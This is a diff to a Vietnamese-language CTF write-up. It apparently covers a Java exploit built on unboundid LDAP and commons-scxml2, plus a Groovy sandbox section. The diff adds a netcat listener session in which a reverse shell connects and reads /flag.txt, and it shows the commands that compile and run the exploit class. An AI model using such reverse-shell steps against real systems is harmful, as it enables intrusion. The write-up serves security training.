@@ -227,7 +227,7 @@ public class Exp implements Runnable {
 }
 ```
 Compile file và chạy:
-![](http://note.bksec.vn/pad/uploads/8c89f8d0-4e7b-4c54-b2d8-0d908adc42ae.png)
+[image](/images/shiba-coin_03.png)
 
 ```
 javac -cp ".;unboundid-ldapsdk-7.0.1.jar;commons-scxml2-2.0-SNAPSHOT.jar" Exp.java
@@ -236,8 +236,13 @@ java -cp ".;unboundid-ldapsdk-7.0.1.jar;commons-scxml2-2.0-SNAPSHOT.jar" Exp
 ```
 
 Lấy flag:
-![](http://note.bksec.vn/pad/uploads/a91d8576-4d6e-4e23-9427-fbd28527080f.png)
-
+```
+> nc -nvlp 9003
+listening on [any] 9003 ...
+connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 49304
+cat /flag.txt
+BKSEC{Fake_Flag}
+```
 >Flag:  BKSEC{Fake_Flag}
 
 ---
@@ -295,7 +300,7 @@ Không được kích hoạt mặc định trong hầu hết ứng dụng trừ 
 Vì vậy, nếu không có SecurityManager hoặc cấu hình yếu, các script Groovy có thể thoải mái chạy lệnh hệ thống.
 
 **Demo of secure vs. vulnerable config**
-🔓 Insecure demo (no sandbox):
+Insecure demo (no sandbox):
 ```java
 import groovy.lang.GroovyShell;
 
@@ -313,7 +318,7 @@ public class Demo {
     }
 }
 ```
-🔐 Secure setup with custom SecurityManager (Java ≤ 16)
+Secure setup with custom SecurityManager (Java ≤ 16)
 ```java
 public class SecureDemo {
     public static void main(String[] args) {
